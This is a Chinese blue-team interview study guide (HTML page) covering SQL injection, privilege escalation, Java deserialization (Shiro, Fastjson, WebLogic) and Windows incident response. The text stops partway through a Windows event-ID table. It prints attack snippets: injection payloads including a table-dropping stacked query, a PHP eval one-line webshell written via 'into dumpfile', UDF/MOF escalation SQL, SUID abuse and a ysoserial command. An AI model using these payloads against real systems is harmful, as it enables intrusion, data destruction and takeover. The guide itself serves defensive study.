@@ -1,0 +1,1698 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="护网蓝队实战操作补全（二）——应急排查实操·深度漏洞分析·提权手法与溯源反制, AI安全, 网络安全, 大模型安全, LLM安全, 渗透测试, 安全运营">
+    <meta name="description" content="本篇文章作为《护网-HVV-面试题大全.md》和《护网蓝队基础补全（一）》的第二弹配套补充，聚焦于面试中容易问到的深度技术细节和实战操作，涵盖 SQL 注入深度补充、提权手法详解、应急排查标准操作、反序列化利用与防御、不出网场景处理、Win">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>护网蓝队实战操作补全（二）——应急排查实操·深度漏洞分析·提权手法与溯源反制 | swfk 的安全笔记</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="swfk 的安全笔记" type="application/atom+xml">
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">swfk 的安全笔记</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">swfk 的安全笔记</div>
+        <div class="logo-desc">
+            
+            记录 AI 安全、网络安全、工具实践与技术复盘。
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">护网蓝队实战操作补全（二）——应急排查实操·深度漏洞分析·提权手法与溯源反制</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%8A%A4%E7%BD%91/">
+                                <span class="chip bg-color">护网</span>
+                            </a>
+                        
+                            <a href="/tags/HVV/">
+                                <span class="chip bg-color">HVV</span>
+                            </a>
+                        
+                            <a href="/tags/%E8%93%9D%E9%98%9F/">
+                                <span class="chip bg-color">蓝队</span>
+                            </a>
+                        
+                            <a href="/tags/%E9%9D%A2%E8%AF%95/">
+                                <span class="chip bg-color">面试</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category">
+                                安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2026-06-24
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>本篇文章作为《护网-HVV-面试题大全.md》和《护网蓝队基础补全（一）》的第二弹配套补充，聚焦于面试中容易问到的深度技术细节和实战操作，涵盖 SQL 注入深度补充、提权手法详解、应急排查标准操作、反序列化利用与防御、不出网场景处理、Windows 主机排查实操等内容。</p>
+<span id="more"></span>
+
+<hr>
+<h2 id="一、SQL-注入深度补充（面试高频追问）"><a href="#一、SQL-注入深度补充（面试高频追问）" class="headerlink" title="一、SQL 注入深度补充（面试高频追问）"></a>一、SQL 注入深度补充（面试高频追问）</h2><h3 id="1-1-SQL-注入的六种类型"><a href="#1-1-SQL-注入的六种类型" class="headerlink" title="1.1 SQL 注入的六种类型"></a>1.1 SQL 注入的六种类型</h3><p>SQLMAP 将 SQL 注入分为以下六种类型，面试中问到”有哪些注入方式”建议按此回答：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+<th>判断方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>报错注入</td>
+<td>通过数据库报错信息获取数据</td>
+<td>提交错误语法后页面返回数据库错误信息</td>
+</tr>
+<tr>
+<td>布尔盲注</td>
+<td>根据页面返回真&#x2F;假判断条件</td>
+<td><code>and 1=1</code> 正常、<code>and 1=2</code> 异常</td>
+</tr>
+<tr>
+<td>时间盲注</td>
+<td>根据页面响应时间差判断</td>
+<td><code>if(ascii(substr(&quot;hello&quot;,1,1))=104, sleep(5), 1)</code></td>
+</tr>
+<tr>
+<td>联合查询注入</td>
+<td>使用 UNION 拼接查询</td>
+<td><code>union select 1,2,3,4--</code></td>
+</tr>
+<tr>
+<td>内联注入</td>
+<td>在原有查询中嵌入额外条件</td>
+<td><code>select * from users where id = 1 or 1=1</code></td>
+</tr>
+<tr>
+<td>堆叠注入</td>
+<td>用 <code>;</code> 分隔执行多条语句</td>
+<td><code>select * from users; drop table admins--</code></td>
+</tr>
+</tbody></table>
+<p><strong>面试加分点：</strong> 提到堆叠注入在 MySQL 中通常受限（多数 API 不支持多语句），而在 SQL Server 和 PostgreSQL 中更常见。</p>
+<h3 id="1-2-报错注入的十种函数"><a href="#1-2-报错注入的十种函数" class="headerlink" title="1.2 报错注入的十种函数"></a>1.2 报错注入的十种函数</h3><p>MySQL 报错注入常见函数（建议记住前 4 个，其余了解即可）：</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>函数</th>
+<th>语法示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>extractvalue()</code></td>
+<td><code>and extractvalue(1, concat(0x7e,(select @@version),0x7e))</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>updatexml()</code></td>
+<td><code>and updatexml(1, concat(0x7e,(select @@version),0x7e),1)</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>floor()</code></td>
+<td><code>and (select 1 from (select count(*),concat(floor(rand(0)*2),0x7e,(select user()))a from information_schema.tables group by a)b)</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>exp()</code></td>
+<td><code>and exp(~(select * from(select user())a))</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>geometrycollection()</code></td>
+<td><code>and geometrycollection((select * from(select * from(select user())a)b))</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>multipoint()</code></td>
+<td><code>and multipoint((select * from(select * from(select user())a)b))</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>polygon()</code></td>
+<td><code>and polygon((select * from(select * from(select user())a)b))</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>multipolygon()</code></td>
+<td><code>and multipolygon((select * from(select * from(select user())a)b))</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td><code>linestring()</code></td>
+<td><code>and linestring((select * from(select * from(select user())a)b))</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td><code>multilinestring()</code></td>
+<td><code>and multilinestring((select * from(select * from(select user())a)b))</code></td>
+</tr>
+</tbody></table>
+<h3 id="1-3-盲注-vs-延时注入共同点"><a href="#1-3-盲注-vs-延时注入共同点" class="headerlink" title="1.3 盲注 vs 延时注入共同点"></a>1.3 盲注 vs 延时注入共同点</h3><p><strong>面试高频问题：</strong> “盲注和延时注入的共同点？”</p>
+<p>共同点：<strong>都是一个字符一个字符地猜解</strong>。通过逐字符比较（<code>substr()</code>、<code>mid()</code>、<code>ascii()</code> 等函数）来获取数据库内容，效率低但稳定。</p>
+<h3 id="1-4-SQL-注入写文件函数"><a href="#1-4-SQL-注入写文件函数" class="headerlink" title="1.4 SQL 注入写文件函数"></a>1.4 SQL 注入写文件函数</h3><p>面试问”写 WebShell 需要什么条件”时回答重点：</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;一句话木马内容&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;路径&#x27;</span>
+<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;一句话木马内容&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;路径&#x27;</span>
+<span class="hljs-comment">-- 示例：</span>
+<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;d:\\wwwroot\\baidu.com\\nvhack.php&#x27;</span></code></pre>
+
+<p><strong><code>into outfile</code> 与 <code>into dumpfile</code> 的区别：</strong></p>
+<ul>
+<li><code>outfile</code>：写文件时会添加换行符和转义，可能破坏二进制文件</li>
+<li><code>dumpfile</code>：按原样写入，不添加任何额外内容，适合写二进制数据</li>
+</ul>
+<p><strong>写入条件：</strong></p>
+<ol>
+<li>MySQL 全局变量 <code>secure_file_priv</code> 不为 NULL</li>
+<li>数据库用户有 <code>FILE</code> 权限</li>
+<li>目标目录有 MySQL 写权限</li>
+</ol>
+<p><strong>回答示例：</strong> “MySQL 写 WebShell 需要确认三个条件——secure_file_priv 不为 NULL、有 FILE 权限、Web 目录可写。用 into dumpfile 写 PHP 一句话是最常见的做法。”</p>
+<hr>
+<h2 id="二、权限提升细节补充"><a href="#二、权限提升细节补充" class="headerlink" title="二、权限提升细节补充"></a>二、权限提升细节补充</h2><h3 id="2-1-MySQL-UDF-提权完整步骤"><a href="#2-1-MySQL-UDF-提权完整步骤" class="headerlink" title="2.1 MySQL UDF 提权完整步骤"></a>2.1 MySQL UDF 提权完整步骤</h3><p><strong>要求：</strong></p>
+<ol>
+<li>目标系统为 Windows（Win2000&#x2F;XP&#x2F;2003&#x2F;2008）</li>
+<li>拥有 MySQL 某个用户账号（最好是 root）</li>
+<li>该账号有对 <code>mysql</code> 库的 INSERT 和 DELETE 权限</li>
+</ol>
+<p><strong>步骤：</strong></p>
+<ol>
+<li><p><strong>确认 MySQL 版本和安装路径：</strong></p>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;
+<span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugins%&#x27;</span>;</code></pre>
+</li>
+<li><p><strong>寻找插件目录：</strong> MySQL 5.1 以上版本需将 <code>udf.dll</code> 放在 <code>lib\plugin</code> 目录下</p>
+</li>
+<li><p><strong>导入 UDF 动态库：</strong></p>
+<ul>
+<li>通过 <code>into dumpfile</code> 将 DLL 写到插件目录</li>
+<li>或使用 sqlmap 的 <code>--os-shell</code> 自动处理</li>
+</ul>
+</li>
+<li><p><strong>创建自定义函数：</strong></p>
+<pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_exec <span class="hljs-keyword">returns</span> <span class="hljs-type">integer</span> soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;
+<span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> cmdshell <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;</code></pre>
+</li>
+<li><p><strong>执行系统命令：</strong></p>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_exec(<span class="hljs-string">&#x27;whoami&#x27;</span>);</code></pre></li>
+</ol>
+<p><strong>蓝队视角：</strong> UDF 提权在实战中 MySQL &lt; 5.1 更容易（插件目录限制更少），windows 比 linux 更常见。防守方应监控 <code>mysql\lib\plugin</code> 目录的 DLL 写入和 <code>create function</code> 语句。</p>
+<h3 id="2-2-MySQL-提权的三种方式"><a href="#2-2-MySQL-提权的三种方式" class="headerlink" title="2.2 MySQL 提权的三种方式"></a>2.2 MySQL 提权的三种方式</h3><table>
+<thead>
+<tr>
+<th>方式</th>
+<th>原理</th>
+<th>条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>UDF 提权</strong></td>
+<td>通过自定义函数调用系统命令</td>
+<td>MySQL root + 插件目录可写</td>
+</tr>
+<tr>
+<td><strong>MOF 提权</strong></td>
+<td>利用 Windows 管理规范（WMI）的 MOF 文件每 10 秒自动执行机制</td>
+<td>MySQL root + <code>secure_file_priv</code> 允许 + Windows 系统</td>
+</tr>
+<tr>
+<td><strong>启动项提权</strong></td>
+<td>将 VBS&#x2F;批处理脚本写入 Windows 启动目录</td>
+<td>MySQL 可写启动目录 + 服务器重启</td>
+</tr>
+</tbody></table>
+<p><strong>MOF 提权路径示例：</strong> <code>select load_file(&#39;mof.txt&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;</code></p>
+<p><strong>启动项提权路径：</strong> <code>C:\Documents and Settings\All Users\Start Menu\Programs\Startup\</code></p>
+<h3 id="2-3-Windows-Server-2008-提权特点"><a href="#2-3-Windows-Server-2008-提权特点" class="headerlink" title="2.3 Windows Server 2008 提权特点"></a>2.3 Windows Server 2008 提权特点</h3><p>Windows Server 2008 默认支持 ASPX，原本就具有一定的命令执行能力。面试回答重点：</p>
+<ol>
+<li><strong>系统补丁未修复时：</strong> 利用溢出提权工具（如 MS16-032、MS15-051、MS14-058 等）直接提权</li>
+<li><strong>系统补丁已修复时：</strong> 转向其他方式——土豆家族（JuicyPotato&#x2F;RottenPotato&#x2F;PrintSpoofer）、服务权限利用、DLL 劫持等</li>
+<li><strong>IIS 提权：</strong> 获取 IIS 配置信息，添加后门用户（IIS 6.0 常见）</li>
+<li><strong>SUID 提权（Linux）：</strong> 查找 SUID 文件 <code>find / -perm -4000 2&gt;/dev/null</code>，利用 nmap、find 等命令打开 shell</li>
+</ol>
+<h3 id="2-4-Linux-SUID-提权"><a href="#2-4-Linux-SUID-提权" class="headerlink" title="2.4 Linux SUID 提权"></a>2.4 Linux SUID 提权</h3><blockquote>
+<p>大多数应用用户没有登录权限，可以通过 SUID 提权。</p>
+</blockquote>
+<p><strong>查找 SUID 文件：</strong></p>
+<pre><code class="hljs bash">find / -perm -4000 2&gt;/dev/null</code></pre>
+
+<p><strong>常见可利用的 SUID 文件：</strong> <code>nmap</code>（低版本含交互模式）、<code>find</code>、<code>vim</code>、<code>bash</code>、<code>less</code>、<code>more</code>、<code>cp</code> 等。</p>
+<p><strong>利用方式（以 find 为例）：</strong></p>
+<pre><code class="hljs bash">find / -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;    <span class="hljs-comment"># 以 SUID 文件所有者权限执行</span></code></pre>
+
+<p><strong>查看可登录用户：</strong></p>
+<pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd | grep <span class="hljs-string">&#x27;/bin/bash&#x27;</span>
+awk -F: <span class="hljs-string">&#x27;&#123;if($3==0) print $1&#125;&#x27;</span> /etc/passwd  <span class="hljs-comment"># 查看超级权限账户</span></code></pre>
+
+<h3 id="2-5-不出网场景的处理方法"><a href="#2-5-不出网场景的处理方法" class="headerlink" title="2.5 不出网场景的处理方法"></a>2.5 不出网场景的处理方法</h3><p><strong>漏洞利用不出网（反序列化不回显）：</strong></p>
+<ul>
+<li>让漏洞回显——通过错误回显、DNS 带外（OOB）、HTTP 请求外带等方式</li>
+<li>使用 <code>sleep()</code>、<code>ping</code> 等延时检测来盲确认</li>
+</ul>
+<p><strong>拿到 WebShell 后不出网：</strong></p>
+<ul>
+<li>reg（Windows 远程注册表）上传文件正向连接</li>
+<li>探测出网协议：DNS（通过 nslookup&#x2F;dig 确认）、ICMP（ping 出网）、HTTP&#x2F;S（代理）</li>
+<li>利用 DNS over HTTPS（DoH）绕过限制</li>
+<li>通过已出网的主机做跳板（正向代理转发）</li>
+</ul>
+<hr>
+<h2 id="三、Java-反序列化深度补充"><a href="#三、Java-反序列化深度补充" class="headerlink" title="三、Java 反序列化深度补充"></a>三、Java 反序列化深度补充</h2><h3 id="3-1-Java-序列化-反序列化核心"><a href="#3-1-Java-序列化-反序列化核心" class="headerlink" title="3.1 Java 序列化&#x2F;反序列化核心"></a>3.1 Java 序列化&#x2F;反序列化核心</h3><p><strong>序列化（Serialization）：</strong> Java 对象 → 字节序列（ObjectOutputStream.writeObject()）<br><strong>反序列化（Deserialization）：</strong> 字节序列 → Java 对象（ObjectInputStream.readObject()）</p>
+<p>只有实现了 <code>Serializable</code> 或 <code>Externalizable</code> 接口的类才能被序列化。</p>
+<p><strong>流量检测特征：</strong> Java 序列化数据以十六进制 <code>ac ed 00 05</code> 开头（魔术头 Magic Number），流量分析时可通过该特征快速发现反序列化攻击请求。对应 Base64 编码为 <code>rO0AB</code> 开头。此外还有 fastjson 序列化（JSON 格式）和 protobuf 序列化（二进制但无固定魔数）。</p>
+<p><strong>PHP 序列化格式速记：</strong> <code>O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code>——<code>O</code> 对象、<code>7</code> 类名长度、<code>1</code> 属性数、<code>s</code> 字符串。</p>
+<h3 id="3-2-Java-反序列化写-WebShell（实操方法）"><a href="#3-2-Java-反序列化写-WebShell（实操方法）" class="headerlink" title="3.2 Java 反序列化写 WebShell（实操方法）"></a>3.2 Java 反序列化写 WebShell（实操方法）</h3><p>通过 ysoserial 工具生成 Payload，使用 stderr 输出避免影响 Payload：</p>
+<pre><code class="hljs bash"><span class="hljs-comment"># 如果调用 ysoserial 时命令参数处有 &quot;code:&quot; 就可以执行 Java 代码</span>
+<span class="hljs-comment"># 否则执行系统命令</span>
+java -jar ysoserial.jar CommonsCollections1 <span class="hljs-string">&quot;code:Runtime.getRuntime().exec(&#x27;cmd&#x27;)&quot;</span></code></pre>
+
+<p><strong>步骤：</strong></p>
+<ol>
+<li>使用 ysoserial 生成反序列化 Payload</li>
+<li>将 Payload 发送到目标服务器触发反序列化</li>
+<li>获取 Web 目录路径</li>
+<li>向 Web 目录写入 WebShell 文件</li>
+</ol>
+<p><strong>实战打点策略：</strong> 优先使用 Java 反序列化漏洞（Shiro、Fastjson、WebLogic、用友 OA 等）进行打点，因为 Java Web 程序通常以高权限运行（部分可能降权）。</p>
+<h3 id="3-3-Shiro-漏洞发现方法"><a href="#3-3-Shiro-漏洞发现方法" class="headerlink" title="3.3 Shiro 漏洞发现方法"></a>3.3 Shiro 漏洞发现方法</h3><p><strong>未登录状态：</strong></p>
+<ul>
+<li>请求包 Cookie 中没有 <code>rememberMe</code> 字段，返回包 <code>Set-Cookie</code> 中也没有 <code>deleteMe</code> 字段</li>
+</ul>
+<p><strong>登录失败（不管是否勾选 RememberMe）：</strong></p>
+<ul>
+<li>返回包都会有 <code>rememberMe=deleteMe</code> 字段</li>
+</ul>
+<p><strong>登录成功（不勾选 RememberMe）：</strong></p>
+<ul>
+<li>返回包 <code>Set-Cookie</code> 中有 <code>rememberMe=deleteMe</code> 字段</li>
+<li>但后续所有请求的 Cookie 中都不会有 <code>rememberMe</code> 字段</li>
+</ul>
+<p><strong>登录成功（勾选 RememberMe）：</strong></p>
+<ul>
+<li>返回包 <code>Set-Cookie</code> 有 <code>rememberMe=deleteMe</code> 字段</li>
+<li>还会有 <code>rememberMe</code> 字段</li>
+<li>之后所有请求的 Cookie 中都会有 <code>rememberMe</code> 字段</li>
+</ul>
+<p><strong>Shiro 漏洞类型：</strong></p>
+<ul>
+<li><strong>Shiro 550：</strong> RememberMe 使用默认密钥，攻击者可构造恶意反序列化数据触发 RCE</li>
+<li><strong>Shiro 721：</strong> RememberMe 使用动态密钥，但可以通过 Padding Oracle 攻击绕过</li>
+</ul>
+<p><strong>简易检测：</strong> 登录失败时返回 <code>rememberMe=deleteMe</code> Cookie，或者在请求头中添加 <code>rememberMe=任意值</code> 查看响应差异。也可使用 ShiroScan 被动扫描发现。</p>
+<h3 id="3-4-Fastjson-漏洞利用原理"><a href="#3-4-Fastjson-漏洞利用原理" class="headerlink" title="3.4 Fastjson 漏洞利用原理"></a>3.4 Fastjson 漏洞利用原理</h3><p><strong>核心原理：</strong> Fastjson 在处理 JSON 对象时没有对 <code>@type</code> 字段进行充分过滤，攻击者可以传入恶意的 <code>TemplatesImpl</code> 类，该类有一个 <code>_bytecodes</code> 字段，部分函数会根据这个字段生成 Java 实例——这就达到了通过字段传入恶意类，再通过类被生成时执行构造函数中的恶意代码。</p>
+<p><strong>防守方重点：</strong> 关注请求 Body 中 <code>@type</code> 字段、检测反序列化链对应的特征字节码。</p>
+<h3 id="3-5-WebLogic-漏洞概览"><a href="#3-5-WebLogic-漏洞概览" class="headerlink" title="3.5 WebLogic 漏洞概览"></a>3.5 WebLogic 漏洞概览</h3><table>
+<thead>
+<tr>
+<th>漏洞类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>T3 协议反序列化</td>
+<td>CVE-2015-4852、CVE-2016-0638、CVE-2017-3248 等，T3 协议传输恶意序列化数据</td>
+</tr>
+<tr>
+<td>XML 解析反序列化</td>
+<td>XMLDecoder 反序列化 RCE（CVE-2017-10271、CVE-2019-2725）</td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td>CVE-2014-4210，可探测内网</td>
+</tr>
+<tr>
+<td>权限绕过</td>
+<td>CVE-2020-14882 + CVE-2020-14750，未授权访问控制台</td>
+</tr>
+<tr>
+<td>权限绕过 + RCE</td>
+<td>CVE-2021-2109 等</td>
+</tr>
+<tr>
+<td>IIOP 协议</td>
+<td>Java RMI 的另一种实现方式，默认使用 JRMP 协议也可选择 IIOP，同样存在反序列化风险</td>
+</tr>
+</tbody></table>
+<p><strong>IIOP 与 RMI 的关系：</strong></p>
+<ul>
+<li>Java RMI（Remote Method Invocation）默认使用 JRMP 协议</li>
+<li>IIOP（Internet Inter-ORB Protocol）是 CORBA 的传输协议，也可以用于 RMI 通信</li>
+<li>两者本质上都是远程方法调用，都面临反序列化攻击风险</li>
+<li>IIOP 较 JRMP 更复杂，攻击面更多</li>
+</ul>
+<p><strong>WebLogic 权限绕过方式：</strong> 使用 <code>./</code> 进行路径拼接绕过鉴权（<code>/console/css/./console.portal</code>），利用路径规范化差异绕过控制台登录。</p>
+<hr>
+<h2 id="四、Windows-应急排查实操（标准步骤）"><a href="#四、Windows-应急排查实操（标准步骤）" class="headerlink" title="四、Windows 应急排查实操（标准步骤）"></a>四、Windows 应急排查实操（标准步骤）</h2><h3 id="4-1-查看系统是否存在可疑账号"><a href="#4-1-查看系统是否存在可疑账号" class="headerlink" title="4.1 查看系统是否存在可疑账号"></a>4.1 查看系统是否存在可疑账号</h3><pre><code class="hljs cmd"># 查看所有用户
+<span class="hljs-built_in">net</span> user
+lusrmgr.msc    # 打开用户管理界面，检查是否有新增/可疑账号
+
+# 查看 Administrators 组成员
+<span class="hljs-built_in">net</span> localgroup administrators</code></pre>
+
+<h3 id="4-2-查看隐藏账号和克隆账号"><a href="#4-2-查看隐藏账号和克隆账号" class="headerlink" title="4.2 查看隐藏账号和克隆账号"></a>4.2 查看隐藏账号和克隆账号</h3><p><strong>隐藏账号检测（注册表方法）：</strong></p>
+<ol>
+<li>Win+R 输入 <code>regedit</code> 打开注册表</li>
+<li>检查 <code>SAM</code> 键值：<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code></li>
+<li>对比注册表中的用户列表与 <code>net user</code> 显示的用户列表是否一致</li>
+</ol>
+<p><strong>克隆账号检测：</strong> 使用 D盾_Web 查杀工具，集成了克隆账号检测功能。</p>
+<h3 id="4-3-结合日志检查管理员登录异常"><a href="#4-3-结合日志检查管理员登录异常" class="headerlink" title="4.3 结合日志检查管理员登录异常"></a>4.3 结合日志检查管理员登录异常</h3><pre><code class="hljs cmd">eventvwr.msc    # 打开&quot;事件查看器&quot;</code></pre>
+
+<p><strong>重点关注日志 ID：</strong></p>
+<table>
+<thead>
+<tr>
+<th>日志 ID</th>
+<th>说明</th>
+<th>关注点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>4624</td>
+<td>成功登录</td>
+<td>异常时间、异常来源 IP</td>
+</tr>
+<tr>
+<td>4625</td>
+<td>登录失败</td>
+<td>暴力破解尝试</td>
+</tr>
+<tr>
+<td>4672</td>
+<td>特殊登录（赋予管理员权限）</td>
+<td>异常高权限登录</td>
+</tr>
+<tr>
+<td>4634&#x2F;4647</td>
+<td>注销</td>
+<td>配合 4624 确定登录时长</td>
+</tr>
+<tr>
+<td>4720</td>
+<td>创建用户</td>
+<td>可疑账号创建</td>
+</tr>
+<tr>
+<td>4732</td>
+<td>用户加入安全组</td>
+<td>被加入 Administrators 组</td>
+</tr>
+<tr>
+<td>7045</td>
+<td>安装服务</td>
+<td>恶意服务安装</td>
+</tr>
+</tbody></table>
